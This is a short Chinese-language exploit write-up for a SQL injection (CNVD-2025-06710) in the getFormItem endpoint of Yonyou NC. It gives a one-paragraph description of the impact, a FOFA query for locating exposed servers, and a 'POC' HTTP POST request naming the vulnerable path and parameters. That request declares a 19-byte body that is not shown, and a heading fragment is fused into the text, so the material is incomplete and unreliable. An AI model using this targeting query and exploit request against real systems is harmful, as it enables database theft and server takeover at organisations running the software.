## 用友NC-getFormItem-SQL注入漏洞(CNVD-2025-06710)

## 一、漏洞简介
用友NC getFormItem 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。02搜索引擎

## fofa
```
app="用友-UFIDA-NC"
```

## POC
```
POST /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```
